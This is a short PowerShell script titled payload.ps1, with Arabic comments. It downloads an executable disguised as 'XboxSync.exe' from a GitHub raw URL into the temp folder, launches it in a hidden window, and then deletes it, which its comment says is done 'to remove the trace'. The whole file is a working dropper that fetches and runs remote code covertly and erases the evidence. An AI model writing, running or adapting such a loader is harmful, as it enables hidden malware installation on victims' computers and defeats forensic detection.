# payload.ps1
$url = "https://raw.githubusercontent.com/zawistyly/my-files/refs/heads/main/XboxSync.exe"
$path = "$env:TEMP\XboxSync.exe"

# تحميل الملف إلى المجلد المؤقت
(New-Object Net.WebClient).DownloadFile($url, $path)

# تشغيل الملف
Start-Process $path -WindowStyle Hidden

# (اختياري) حذف الملف بعد ثوانٍ لإزالة الأثر
Start-Sleep -Seconds 10
Remove-Item $path -Force